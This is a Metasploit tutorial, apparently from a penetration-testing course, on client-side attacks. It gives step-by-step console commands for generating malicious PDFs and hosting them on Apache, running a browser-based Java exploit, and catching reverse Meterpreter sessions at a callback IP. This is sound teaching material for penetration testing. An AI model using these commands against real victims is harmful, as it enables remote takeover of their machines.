### Adobe Utility Printf Exploit

The `adobe_utilprintf` module in Metasploit is unique compared to other modules we've encountered. This is a client-side attack, so it does not require an `RHOST` option. Unlike browser-based attacks, it also lacks `SRVHOST` and `SRVPORT` options. The module generates a malicious PDF, and it is up to the user to host and deliver this file, as well as to set up a payload handler.

#### Setting Up the Exploit

To use the `adobe_utilprintf` module, follow these steps:

1. **Load the Module:**
   ```bash
   msf > use exploit/windows/fileformat/adobe_utilprintf
   ```

2. **Show Options:**
   ```bash
   msf exploit(adobe_utilprintf) > show options
   ```
   The only required option is `uFILENAME`, which specifies the name of the generated PDF file.
   ```plaintext
   Module options (exploit/windows/fileformat/adobe_utilprintf):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   uFILENAME  msf.pdf          yes       The file name.
   ```

3. **Set the Target:**
   ```bash
   msf exploit(adobe_utilprintf) > set target 0
   ```

4. **Generate the Malicious PDF:**
   ```bash
   msf exploit(adobe_utilprintf) > exploit
   ```
   This command will create the `msf.pdf` file, which can be found at `/root/.msf4/local/msf.pdf`.

#### Hosting and Delivering the PDF

1. **Copy the PDF to the Web Server Directory:**
   ```bash
   msf exploit(adobe_utilprintf) > cp /root/.msf4/local/msf.pdf /var/www
   ```

2. **Start the Apache Web Server:**
   ```bash
   msf exploit(adobe_utilprintf) > service apache2 start
   ```

3. **Set Up the Payload Handler:**
   - Load the `multi/handler` module:
     ```bash
     msf > use multi/handler
     ```
   - Set the payload and local host:
     ```bash
     msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
     msf exploit(handler) > set LHOST 192.168.20.9
     ```
   - Start the handler:
     ```bash
     msf exploit(handler) > exploit
     ```

When the victim opens the malicious PDF, you will receive a Meterpreter session.

### Handling Multiple Sessions

To handle multiple sessions, set the `ExitOnSession` option to `false`:

```bash
msf exploit(handler) > set ExitOnSession false
```

This allows the handler to remain open and catch additional incoming connections. To run the handler in the background, use the `-j` option:

```bash
msf exploit(handler) > exploit -j
```

### PDF Embedded Executable

Another PDF attack involves embedding a malicious executable within the PDF. The corresponding Metasploit module is `adobe_pdf_embedded_exe`.

#### Setting Up the Module

1. **Load the Module:**
   ```bash
   msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe
   ```

2. **Show Options:**
   ```bash
   msf exploit(adobe_pdf_embedded_exe) > show options
   ```
   Key options include:
   - `EXENAME`: The name of the payload executable.
   - `FILENAME`: The output filename.
   - `INFILENAME`: The input PDF filename.
   - `LAUNCH_MESSAGE`: The message to display to the user.

3. **Set the Relevant Options:**
   ```bash
   msf exploit(adobe_pdf_embedded_exe) > set INFILENAME /usr/share/set/readme/User_Manual.pdf
   msf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp
   msf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.20.9
   ```

4. **Generate the Malicious PDF:**
   ```bash
   msf exploit(adobe_pdf_embedded_exe) > exploit
   ```
   This will create the `evil.pdf` file, which is stored at `/root/.msf4/local/evil.pdf`.

When the victim opens the PDF and clicks "Open" on the warning, the embedded executable will run, and you will receive a Meterpreter session.

### Java Exploits

Java vulnerabilities are a common client-side attack vector, allowing for cross-platform exploitation. One such vulnerability is addressed by the `java_jre17_jmxbean` module.

#### Setting Up the Java Exploit

1. **Load the Module:**
   ```bash
   msf > use exploit/multi/browser/java_jre17_jmxbean
   ```

2. **Show Options:**
   ```bash
   msf exploit(java_jre17_jmxbean) > show options
   ```
   Key options include:
   - `SRVHOST`: The local host to listen on.
   - `SRVPORT`: The local port to listen on.
   - `URIPATH`: The URI to use for the exploit.

3. **Set the Relevant Options:**
   ```bash
   msf exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9
   msf exploit(java_jre17_jmxbean) > set SRVPORT 80
   msf exploit(java_jre17_jmxbean) > set URIPATH javaexploit
   ```

4. **Set the Payload:**
   ```bash
   msf exploit(java_jre17_jmxbean) > set payload java/meterpreter/reverse_http
   ```

5. **Start the Exploit:**
   ```bash
   msf exploit(java_jre17_jmxbean) > exploit
   ```

When the victim browses to the malicious page, you will receive a Meterpreter session. The HTTP and HTTPS Meterpreter payloads can reattach to dropped sessions, providing persistent access.

### Signed Java Applet

If the target has a fully patched Java installation, a signed Java applet can be used to bypass the need for an unpatched Java version. This method requires the user to trust the certificate, but it can be effective in certain scenarios.

By following these steps, you can effectively use Metasploit to conduct client-side attacks using various techniques.